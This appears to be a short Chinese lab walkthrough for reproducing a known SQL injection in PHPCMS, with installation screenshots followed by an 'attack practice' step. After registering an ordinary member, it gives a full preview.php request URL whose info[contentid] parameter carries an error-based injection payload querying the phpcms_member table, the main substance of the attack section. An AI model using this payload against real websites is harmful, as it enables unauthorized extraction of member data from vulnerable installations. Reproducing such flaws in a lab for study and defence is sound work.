# 实战
在浏览器输入
```
http://IP:PORT/install/
```
## 安装

![image]({path}/1.png)

![image]({path}/2.png)

![image]({path}/3.png)

![image]({path}/4.png)

![image]({path}/5.png)




## 攻击实战

首先要注册一个普通会员

![image]({path}/6.png)

![image]({path}/7.png)

![image]({path}/8.png)

在浏览器输入
```
http://192.168.1.170:7777/preview.php?info[catid]=15&content=a[page]b&info[contentid]=2' and (select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,md5(1),0x3a,md5(1),0x27,0x7e) from phpcms_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)-- a
```
![image]({path}/10.png)
